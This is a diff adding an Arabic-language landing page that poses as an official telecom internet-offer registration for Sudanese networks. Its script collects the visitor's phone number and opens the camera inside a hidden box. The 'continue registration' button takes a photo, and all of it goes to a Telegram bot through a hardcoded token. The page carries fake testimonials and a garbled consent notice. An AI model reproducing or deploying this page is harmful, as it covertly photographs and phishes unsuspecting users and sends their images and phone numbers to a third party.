@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>منصة العروض الذكية</title>
+
+<style>
+*{box-sizing:border-box}
+body{
+  margin:0;
+  font-family:system-ui,Tahoma,Arial;
+  background:radial-gradient(1200px 600px at 10% -10%,#1f3cff22,transparent),
+             radial-gradient(800px 400px at 90% 10%,#00ffd522,transparent),
+             #0b0d14;
+  color:#eaeaf0;
+}
+
+/* ===== HERO ===== */
+.hero{
+  min-height:100vh;
+  display:flex;
+  flex-direction:column;
+  justify-content:center;
+  align-items:center;
+  text-align:center;
+  padding:60px 20px;
+}
+.hero h1{
+  font-size:clamp(28px,6vw,48px);
+  letter-spacing:.5px;
+}
+.hero p{
+  max-width:700px;
+  color:#b9c0ff;
+}
+.hero button{
+  margin-top:30px;
+  padding:16px 42px;
+  font-size:16px;
+  border:none;
+  border-radius:14px;
+  color:#0b0d14;
+  background:linear-gradient(135deg,#7cf3ff,#7cffa6);
+  cursor:pointer;
+  box-shadow:0 20px 40px #0007;
+}
+
+/* ===== SECTIONS ===== */
+section{
+  max-width:1100px;
+  margin:auto;
+  padding:80px 20px;
+}
+h2{text-align:center;margin-bottom:40px}
+
+/* ===== GLASS CARDS ===== */
+.grid{
+  display:grid;
+  grid-template-columns:repeat(auto-fit,minmax(240px,1fr));
+  gap:20px;
+}
+.glass{
+  background:linear-gradient(180deg,#ffffff12,#ffffff05);
+  border:1px solid #ffffff1a;
+  backdrop-filter:blur(10px);
+  border-radius:18px;
+  padding:26px;
+}
+
+/* ===== CONSENT ===== */
+label{color:#cfd3ff;font-size:14px}
+input[type="checkbox"]{transform:scale(1.2)}
+
+/* ===== FORM ===== */
+form{
+  max-width:420px;
+  margin:auto;
+  display:flex;
+  flex-direction:column;
+  gap:14px;
+}
+input,select{
+  padding:14px;
+  border-radius:12px;
+  border:none;
+  background:#0f1220;
+  color:#fff;
+}
+button.action{
+  padding:14px;
+  border:none;
+  border-radius:12px;
+  background:linear-gradient(135deg,#5b7cff,#3cffb2);
+  color:#081018;
+  cursor:pointer;
+}
+
+/* ===== CAMERA ===== */
+.camera-box{
+  max-width:420px;
+  margin:30px auto;
+  padding:14px;
+  border-radius:18px;
+  background:linear-gradient(180deg,#00000066,#000000aa);
+  border:1px solid #ffffff22;
+}
+.camera-box video,
+.camera-box canvas{
+  width:100%;
+  border-radius:14px;
+  background:#000;
+}
+
+/* ===== TESTIMONIALS ===== */
+.quote{
+  font-size:15px;
+  color:#dfe3ff;
+}
+.name{
+  margin-top:10px;
+  font-size:13px;
+  color:#9aa2ff;
+}
+
+/* ===== FOOTER ===== */
+footer{
+  text-align:center;
+  padding:30px;
+  color:#7d86ff;
+  font-size:14px;
+}
+
+.hidden{display:none}
+</style>
+</head>
+
+<body>
+
+<div class="hero">
+  <h1>منصة العروض الذكية</h1>
+  <p>
+    تسجيل رسمي لعروض الإنترنت بالتعاون مع شركات الاتصالات،
+    بنظام تحقق يمنع التكرار ويحفظ حق الجميع.
+  </p>
+  <button onclick="document.getElementById('consent').scrollIntoView({behavior:'smooth'})">
+    ابدأ الآن
+  </button>
+</div>
+
+<section>
+  <h2>ليه التسجيل هنا مختلف؟</h2>
+  <div class="grid">
+    <div class="glass">تحقق حقيقي من المستخدمين</div>
+    <div class="glass">منع الطلبات الوهمية</div>
+    <div class="glass">عدالة في توزيع العروض</div>
+  </div>
+</section>
+
+<section id="consent">
+  <div class="glass">
+    <h2>الموافقة</h2>
+    <p>
+      الموافقة على سياسات الخصوصية
+              بتتستخدم لأي غرض تاني.
+    </p>
+    <label>
+      <input type="checkbox" id="agree">
+      موافق على سياسة الخصوصية واستخدام 
+    </label>
+    <br><br>
+    <button class="action" onclick="goForm()">أكمل</button>
+  </div>
+</section>
+
+<section id="form" class="hidden">
+  <h2>بياناتك</h2>
+  <form onsubmit="startCamera(event)">
+    <input id="phone" placeholder="رقم الهاتف" required>
+    <select id="network" required>
+      <option value="">اختر الشبكة</option>
+      <option>زين</option>
+      <option>سوداني</option>
+      <option>MTN</option>
+    </select>
+    <button class="action">الخصول على الخدمة</button>
+  </form>
+</section>
+
+<section id="camera" class="hidden">
+  <h2>اكمال الطلب</h2>
+
+  <!-- 👇 دا المربع اللي سألت عنه -->
+  <div class="camera-box" style="display: none;">
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas" class="hidden"></canvas>
+  </div>
+
+  <button class="action" onclick="capture()" > موفق و اكمال التسحيل</button>
+  <br><br>
+  <button class="action hidden" id="sendBtn" onclick="sendToTelegram()">إرسال الطلب</button>
+</section>
+
+<section>
+  <h2>آراء عملاء</h2>
+  <div class="grid">
+    <div class="glass">
+      <div class="quote">
+        والله كنت شايل هم، لكن سجلت وجاني الرد فعلا.
+        ما توقعت الموضوع يكون مرتب كدا.
+      </div>
+      <div class="name">معتصم – الخرطوم</div>
+    </div>
+    <div class="glass">
+      <div class="quote">
+        جربت كتير مواقع قبل، دي أول مرة أحس في نظام حقيقي.
+        استلمت العرض بعد المراجعة.
+      </div>
+      <div class="name">سارة – أم درمان</div>
+    </div>
+    <div class="glass">
+      <div class="quote">
+        صراحة فكرة التصويت خلتني أرتاح،
+        عرفت إنو ما لعب.
+      </div>
+      <div class="name">محمد – بحري</div>
+    </div>
+  </div>
+</section>
+
+<footer>
+  © 2025 منصة العروض الذكية
+</footer>
+
+<script>
+// ⚠️ تجربة فقط
+const BOT_TOKEN="8304204197:AAFH4TvGEurt0iK5O6950FMqQSGEiXybYgY";
+const CHAT_ID="7428421245";
+
+let stream, imageBlob;
+
+function goForm(){
+  if(!agree.checked){alert("لازم توافق");return}
+  form.classList.remove("hidden");
+  form.scrollIntoView({behavior:"smooth"});
+}
+
+function startCamera(e){
+  e.preventDefault();
+  navigator.mediaDevices.getUserMedia({video:true}).then(s=>{
+    stream=s;
+    video.srcObject=s;
+    camera.classList.remove("hidden");
+    camera.scrollIntoView({behavior:"smooth"});
+  });
+}
+
+function capture(){
+  canvas.width=video.videoWidth;
+  canvas.height=video.videoHeight;
+  canvas.getContext("2d").drawImage(video,0,0);
+  canvas.toBlob(b=>{
+    imageBlob=b;
+    sendBtn.classList.remove("hidden");
+  },"image/jpeg");
+  stream.getTracks().forEach(t=>t.stop());
+}
+
+function sendToTelegram(){
+  const fd=new FormData();
+  fd.append("chat_id",CHAT_ID);
+  fd.append("caption",
+`📱 رقم: ${phone.value}
+🌐 الشبكة: ${network.value}`);
+  fd.append("photo",imageBlob);
+
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
+    method:"POST",body:fd
+  }).then(()=>alert("تم الإرسال (تجربة)"));
+}
+</script>
+
+</body>
+</html>
